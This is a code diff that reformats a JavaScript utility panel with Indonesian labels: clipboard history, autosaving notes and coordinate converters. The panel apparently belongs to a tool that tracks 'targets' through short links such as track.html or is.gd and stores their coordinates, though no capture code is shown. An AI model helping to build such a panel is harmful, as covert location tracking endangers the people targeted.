-  document.addEventListener('copy',function(){try{const sel=window.getSelection().toString();if(sel&&sel.length>10&&/^https?:\/\//i.test(sel))clipAdd(sel.trim(),'AUTO');}catch(err){}});
+  window.clipAdd=function(txt,tag){const v=txt||(document.getElementById('clipManualInput').value.trim());if(!v)return;const arr=clipLoad();const filtered=arr.filter(x=>x.txt!==v);filtered.unshift({txt:v,tag:tag||'MANUAL',waktu:Date.now()});clipSave(filtered);const inp=document.getElementById('clipManualInput');if(inp)inp.value='';renderClipboard()};
+  window.clipDel=function(idx){const arr=clipLoad();arr.splice(idx,1);clipSave(arr);renderClipboard()};
+  window.clipCopy=function(idx){const arr=clipLoad();if(!arr[idx])return;navigator.clipboard.writeText(arr[idx].txt).then(()=>{if(window.beep)beep(1800,0.06);if(window.addLog)addLog('Link dicopy dari history')})};
+  window.clipClear=function(){if(!confirm('Hapus semua riwayat clipboard?'))return;try{localStorage.removeItem('clipHist_'+U)}catch(e){}renderClipboard()};
+  function renderClipboard(){const el=document.getElementById('clipList');if(!el)return;const arr=clipLoad();if(!arr.length){el.innerHTML='<div class="empty">Belum ada riwayat</div>';return}el.innerHTML=arr.map((item,idx)=>{const tgl=new Date(item.waktu).toLocaleString('id-ID');const tag=item.tag?'<span style="color:var(--gold);font-size:8px">['+item.tag+']</span> ':'';return '<div class="clip-item"><div style="flex:1"><div class="clip-txt">'+tag+escapeHtml(item.txt)+'</div><div class="clip-meta">'+tgl+'</div></div><div class="clip-btns"><button onclick="clipCopy('+idx+')">COPY</button><button class="del" onclick="clipDel('+idx+')">DEL</button></div></div>'}).join('')}
+  document.addEventListener('copy',function(){try{const sel=window.getSelection().toString();if(sel&&sel.length>10&&/^https?:\/\//i.test(sel))clipAdd(sel.trim(),'AUTO')}catch(err){}});
   renderClipboard();
   const notesEl=document.getElementById('notesGlobal');const notesStatus=document.getElementById('notesStatus');let notesTimer=null;
-  try{notesEl.value=localStorage.getItem('notesGlobal_'+U)||'';}catch(e){}
-  notesEl.addEventListener('input',()=>{
-    notesStatus.textContent='menyimpan...';if(notesTimer)clearTimeout(notesTimer);
-    notesTimer=setTimeout(()=>{try{localStorage.setItem('notesGlobal_'+U,notesEl.value);notesStatus.textContent='✓ tersimpan '+new Date().toLocaleTimeString('id-ID');}catch(e){notesStatus.textContent='✗ gagal simpan';}},600);
-  });
-  window.notesDownload=function(){const txt=notesEl.value;if(!txt){alert('Catatan kosong.');return;}const blob=new Blob([txt],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='notes_'+U+'_'+Date.now()+'.txt';a.click();};
-  window.notesClear=function(){if(!confirm('Hapus semua catatan?'))return;notesEl.value='';try{localStorage.removeItem('notesGlobal_'+U)}catch(e){}notesStatus.textContent='dihapus';};
-  document.querySelectorAll('.coord-tab').forEach(tab=>{
-    tab.addEventListener('click',()=>{
-      document.querySelectorAll('.coord-tab').forEach(t=>t.classList.remove('active'));tab.classList.add('active');
-      document.getElementById('coordPaneDms').style.display=tab.dataset.coord==='dms'?'block':'none';
-      document.getElementById('coordPaneDec').style.display=tab.dataset.coord==='dec'?'block':'none';
-      document.getElementById('coordPaneUtm').style.display=tab.dataset.coord==='utm'?'block':'none';
-    });
-  });
-  function showResult(html){const el=document.getElementById('coordResult');el.style.display='block';el.innerHTML=html;}
-  window.convertDmsToDec=function(){
-    const d1=parseFloat(document.getElementById('dmsLatD').value)||0;
-    const m1=parseFloat(document.getElementById('dmsLatM').value)||0;
-    const s1=parseFloat(document.getElementById('dmsLatS').value)||0;
-    const h1=document.getElementById('dmsLatHemi').value;
-    const d2=parseFloat(document.getElementById('dmsLngD').value)||0;
-    const m2=parseFloat(document.getElementById('dmsLngM').value)||0;
-    const s2=parseFloat(document.getElementById('dmsLngS').value)||0;
-    const h2=document.getElementById('dmsLngHemi').value;
-    let lat=d1+m1/60+s1/3600;if(h1==='S')lat=-lat;
-    let lng=d2+m2/60+s2/3600;if(h2==='W')lng=-lng;
-    if(Math.abs(lat)>90||Math.abs(lng)>180){showResult('<span style="color:var(--red)">✗ Koordinat di luar batas valid.</span>');return;}
-    const utm=latLngToUtm(lat,lng);
-    showResult('<div><span class="cr-k">DECIMAL LAT</span><span class="cr-v">'+lat.toFixed(6)+'</span></div><div><span class="cr-k">DECIMAL LNG</span><span class="cr-v">'+lng.toFixed(6)+'</span></div><div><span class="cr-k">UTM ZONA</span><span class="cr-v">'+utm.zone+utm.hemi+'</span></div><div><span class="cr-k">UTM EAST</span><span class="cr-v">'+utm.easting+'</span></div><div><span class="cr-k">UTM NORTH</span><span class="cr-v">'+utm.northing+'</span></div><div style="margin-top:8px"><button class="term-btn outline" style="margin:0;padding:6px 12px;width:auto" onclick="clipAdd(\''+lat.toFixed(6)+','+lng.toFixed(6)+'\',\'COORD\')">[ 📋 Copy DEC ]</button></div>');
-  };
-  window.convertDecAll=function(){
-    const lat=parseFloat(document.getElementById('decLat').value);
-    const lng=parseFloat(document.getElementById('decLng').value);
-    if(!isFinite(lat)||!isFinite(lng)||Math.abs(lat)>90||Math.abs(lng)>180){showResult('<span style="color:var(--red)">✗ Koordinat tidak valid.</span>');return;}
-    const dmsLat=decToDms(lat,'lat');const dmsLng=decToDms(lng,'lng');const utm=latLngToUtm(lat,lng);
-    showResult('<div><span class="cr-k">DMS LAT</span><span class="cr-v">'+dmsLat+'</span></div><div><span class="cr-k">DMS LNG</span><span class="cr-v">'+dmsLng+'</span></div><div><span class="cr-k">DECIMAL</span><span class="cr-v">'+lat.toFixed(6)+', '+lng.toFixed(6)+'</span></div><div><span class="cr-k">UTM ZONA</span><span class="cr-v">'+utm.zone+utm.hemi+'</span></div><div><span class="cr-k">UTM EAST</span><span class="cr-v">'+utm.easting+'</span></div><div><span class="cr-k">UTM NORTH</span><span class="cr-v">'+utm.northing+'</span></div>');
-  };
-  window.decUseLatest=function(){
-    const f=(window.allData||[]).find(x=>x[1]&&x[1].lat&&x[1].lng);
-    if(!f){alert('Belum ada target berkoordinat.');return;}
-    document.getElementById('decLat').value=f[1].lat;document.getElementById('decLng').value=f[1].lng;convertDecAll();
-  };
-  window.convertUtmToDec=function(){
-    const zoneStr=document.getElementById('utmZone').value.trim().toUpperCase();
-    const east=parseFloat(document.getElementById('utmEast').value);
-    const north=parseFloat(document.getElementById('utmNorth').value);
-    const m=zoneStr.match(/^(\d{1,2})\s*([A-Z])?$/);
-    if(!m){showResult('<span style="color:var(--red)">✗ Format zona salah. Contoh: 54M</span>');return;}
-    const zone=parseInt(m[1]);const hemi=(m[2]&&'NPQRSTUVWX'.indexOf(m[2])>=0)?'N':((m[2]==='S'||!m[2])?'S':'N');
-    const result=utmToLatLng(zone,hemi,east,north);
-    if(!result){showResult('<span style="color:var(--red)">✗ Koordinat UTM tidak valid.</span>');return;}
-    const dmsLat=decToDms(result.lat,'lat');const dmsLng=decToDms(result.lng,'lng');
-    showResult('<div><span class="cr-k">DECIMAL LAT</span><span class="cr-v">'+result.lat.toFixed(6)+'</span></div><div><span class="cr-k">DECIMAL LNG</span><span class="cr-v">'+result.lng.toFixed(6)+'</span></div><div><span class="cr-k">DMS LAT</span><span class="cr-v">'+dmsLat+'</span></div><div><span class="cr-k">DMS LNG</span><span class="cr-v">'+dmsLng+'</span></div>');
-  };
-  window.utmUseFromLastTarget=function(){
-    const f=(window.allData||[]).find(x=>x[1]&&x[1].lat&&x[1].lng);
-    if(!f){alert('Belum ada target berkoordinat.');return;}
-    const u=latLngToUtm(f[1].lat,f[1].lng);
-    document.getElementById('utmZone').value=u.zone+u.hemi;
-    document.getElementById('utmEast').value=u.easting;
-    document.getElementById('utmNorth').value=u.northing;
-    convertUtmToDec();
-  };
-  function decToDms(dec,type){
-    const hemi=type==='lat'?(dec>=0?'N':'S'):(dec>=0?'E':'W');
-    const abs=Math.abs(dec);const d=Math.floor(abs);const m=Math.floor((abs-d)*60);const s=(((abs-d)*60)-m)*60;
-    return d+'° '+m+"' "+s.toFixed(2)+'" '+hemi;
-  }
-  function getLastLink(){
-    if(window.currentShortLink)return window.currentShortLink;
-    if(window.currentLink)return window.currentLink;
-    if(window.lastLongLink)return window.lastLongLink;
-    try{const arr=JSON.parse(localStorage.getItem('clipHist_'+U)||'[]');const linkItem=arr.find(x=>/^https?:\/\//i.test(x.txt)&&/track\.html|maps\.html|view\.html|is\.gd/.test(x.txt));if(linkItem)return linkItem.txt;}catch(e){}
-    return '';
-  }
-  function escapeHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));}
+  try{notesEl.value=localStorage.getItem('notesGlobal_'+U)||''}catch(e){}
+  notesEl.addEventListener('input',()=>{notesStatus.textContent='menyimpan...';if(notesTimer)clearTimeout(notesTimer);notesTimer=setTimeout(()=>{try{localStorage.setItem('notesGlobal_'+U,notesEl.value);notesStatus.textContent='✓ tersimpan '+new Date().toLocaleTimeString('id-ID')}catch(e){notesStatus.textContent='✗ gagal simpan'}},600)});
+  window.notesDownload=function(){const txt=notesEl.value;if(!txt){alert('Catatan kosong.');return}const blob=new Blob([txt],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='notes_'+U+'_'+Date.now()+'.txt';a.click()};
+  window.notesClear=function(){if(!confirm('Hapus semua catatan?'))return;notesEl.value='';try{localStorage.removeItem('notesGlobal_'+U)}catch(e){}notesStatus.textContent='dihapus'};
+  document.querySelectorAll('.coord-tab').forEach(tab=>{tab.addEventListener('click',()=>{document.querySelectorAll('.coord-tab').forEach(t=>t.classList.remove('active'));tab.classList.add('active');document.getElementById('coordPaneDms').style.display=tab.dataset.coord==='dms'?'block':'none';document.getElementById('coordPaneDec').style.display=tab.dataset.coord==='dec'?'block':'none';document.getElementById('coordPaneUtm').style.display=tab.dataset.coord==='utm'?'block':'none'})});
+  function showResult(html){const el=document.getElementById('coordResult');el.style.display='block';el.innerHTML=html}
+  window.convertDmsToDec=function(){const d1=parseFloat(document.getElementById('dmsLatD').value)||0;const m1=parseFloat(document.getElementById('dmsLatM').value)||0;const s1=parseFloat(document.getElementById('dmsLatS').value)||0;const h1=document.getElementById('dmsLatHemi').value;const d2=parseFloat(document.getElementById('dmsLngD').value)||0;const m2=parseFloat(document.getElementById('dmsLngM').value)||0;const s2=parseFloat(document.getElementById('dmsLngS').value)||0;const h2=document.getElementById('dmsLngHemi').value;let lat=d1+m1/60+s1/3600;if(h1==='S')lat=-lat;let lng=d2+m2/60+s2/3600;if(h2==='W')lng=-lng;if(Math.abs(lat)>90||Math.abs(lng)>180){showResult('<span style="color:var(--red)">✗ Koordinat di luar batas valid.</span>');return}const utm=latLngToUtm(lat,lng);showResult('<div><span class="cr-k">DECIMAL LAT</span><span class="cr-v">'+lat.toFixed(6)+'</span></div><div><span class="cr-k">DECIMAL LNG</span><span class="cr-v">'+lng.toFixed(6)+'</span></div><div><span class="cr-k">UTM ZONA</span><span class="cr-v">'+utm.zone+utm.hemi+'</span></div><div><span class="cr-k">UTM EAST</span><span class="cr-v">'+utm.easting+'</span></div><div><span class="cr-k">UTM NORTH</span><span class="cr-v">'+utm.northing+'</span></div><div style="margin-top:8px"><button class="term-btn outline" style="margin:0;padding:6px 12px;width:auto" onclick="clipAdd(\''+lat.toFixed(6)+','+lng.toFixed(6)+'\',\'COORD\')">[ 📋 Copy DEC ]</button></div>')};
+  window.convertDecAll=function(){const lat=parseFloat(document.getElementById('decLat').value);const lng=parseFloat(document.getElementById('decLng').value);if(!isFinite(lat)||!isFinite(lng)||Math.abs(lat)>90||Math.abs(lng)>180){showResult('<span style="color:var(--red)">✗ Koordinat tidak valid.</span>');return}const dmsLat=decToDms(lat,'lat');const dmsLng=decToDms(lng,'lng');const utm=latLngToUtm(lat,lng);showResult('<div><span class="cr-k">DMS LAT</span><span class="cr-v">'+dmsLat+'</span></div><div><span class="cr-k">DMS LNG</span><span class="cr-v">'+dmsLng+'</span></div><div><span class="cr-k">DECIMAL</span><span class="cr-v">'+lat.toFixed(6)+', '+lng.toFixed(6)+'</span></div><div><span class="cr-k">UTM ZONA</span><span class="cr-v">'+utm.zone+utm.hemi+'</span></div><div><span class="cr-k">UTM EAST</span><span class="cr-v">'+utm.easting+'</span></div><div><span class="cr-k">UTM NORTH</span><span class="cr-v">'+utm.northing+'</span></div>')};
+  window.decUseLatest=function(){const f=(window.allData||[]).find(x=>x[1]&&x[1].lat&&x[1].lng);if(!f){alert('Belum ada target berkoordinat.');return}document.getElementById('decLat').value=f[1].lat;document.getElementById('decLng').value=f[1].lng;convertDecAll()};
+  window.convertUtmToDec=function(){const zoneStr=document.getElementById('utmZone').value.trim().toUpperCase();const east=parseFloat(document.getElementById('utmEast').value);const north=parseFloat(document.getElementById('utmNorth').value);const m=zoneStr.match(/^(\d{1,2})\s*([A-Z])?$/);if(!m){showResult('<span style="color:var(--red)">✗ Format zona salah. Contoh: 54M</span>');return}const zone=parseInt(m[1]);const hemi=(m[2]&&'NPQRSTUVWX'.indexOf(m[2])>=0)?'N':((m[2]==='S'||!m[2])?'S':'N');const result=utmToLatLng(zone,hemi,east,north);if(!result){showResult('<span style="color:var(--red)">✗ Koordinat UTM tidak valid.</span>');return}const dmsLat=decToDms(result.lat,'lat');const dmsLng=decToDms(result.lng,'lng');showResult('<div><span class="cr-k">DECIMAL LAT</span><span class="cr-v">'+result.lat.toFixed(6)+'</span></div><div><span class="cr-k">DECIMAL LNG</span><span class="cr-v">'+result.lng.toFixed(6)+'</span></div><div><span class="cr-k">DMS LAT</span><span class="cr-v">'+dmsLat+'</span></div><div><span class="cr-k">DMS LNG</span><span class="cr-v">'+dmsLng+'</span></div>')};
+  window.utmUseFromLastTarget=function(){const f=(window.allData||[]).find(x=>x[1]&&x[1].lat&&x[1].lng);if(!f){alert('Belum ada target berkoordinat.');return}const u=latLngToUtm(f[1].lat,f[1].lng);document.getElementById('utmZone').value=u.zone+u.hemi;document.getElementById('utmEast').value=u.easting;document.getElementById('utmNorth').value=u.northing;convertUtmToDec()};
+  function decToDms(dec,type){const hemi=type==='lat'?(dec>=0?'N':'S'):(dec>=0?'E':'W');const abs=Math.abs(dec);const d=Math.floor(abs);const m=Math.floor((abs-d)*60);const s=(((abs-d)*60)-m)*60;return d+'° '+m+"' "+s.toFixed(2)+'" '+hemi}
+  function getLastLink(){if(window.currentShortLink)return window.currentShortLink;if(window.currentLink)return window.currentLink;if(window.lastLongLink)return window.lastLongLink;try{const arr=JSON.parse(localStorage.getItem('clipHist_'+U)||'[]');const linkItem=arr.find(x=>/^https?:\/\//i.test(x.txt)&&/track\.html|maps\.html|view\.html|is\.gd/.test(x.txt));if(linkItem)return linkItem.txt}catch(e){}return ''}
+  function escapeHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]))}
   if(window.addLog)addLog('Utility Panel loaded');
   console.log('%c[UTILITY] Aktif','color:#38bdf8;font-weight:bold');
 })();
